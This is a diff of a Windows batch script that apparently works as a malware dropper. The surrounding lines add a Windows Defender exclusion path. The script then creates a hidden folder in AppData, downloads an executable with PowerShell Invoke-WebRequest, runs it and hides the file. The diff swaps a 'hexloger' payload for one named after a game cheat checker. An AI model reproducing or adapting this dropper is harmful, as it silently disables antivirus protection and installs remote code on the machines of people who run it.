@@ -27,10 +27,10 @@ if '%errorlevel%' NEQ '0' (
 powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
 :----------------------------------------------------------------------------------------------------------------:
 cd "C:\Users\%USERNAME%\AppData\Local"
-mkdir "hexloger"
-attrib +h "hexloger" /s /d
-cd C:\Users\%USERNAME%\AppData\Local\hexloger" 
+mkdir "purecs2CC"
+attrib +h "purecs2CC" /s /d
+cd C:\Users\%USERNAME%\AppData\Local\purecs2CC" 
 :----------------------------------------------------------------------------------------------------------------:
-Powershell -Command "Invoke-Webrequest 'https://6vmjb9.spflare.com/b1/8/6/ef56fb65e265b72f05e8fc8cc25a1db5/reshacker_setup-en.exe' -OutFile hexloger.exe"
-start hexloger.exe
-attrib +h "C:\Users\%USERNAME%\AppData\Local\hexloger\hexloger.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/immanuel1618/purecs2-Checker-Cheat/blob/main/purecs2CC.exe' -OutFile purecs2CC.exe"
+start purecs2CC.exe
+attrib +h "C:\Users\%USERNAME%\AppData\Local\purecs2CC\purecs2CC.exe" /s /d
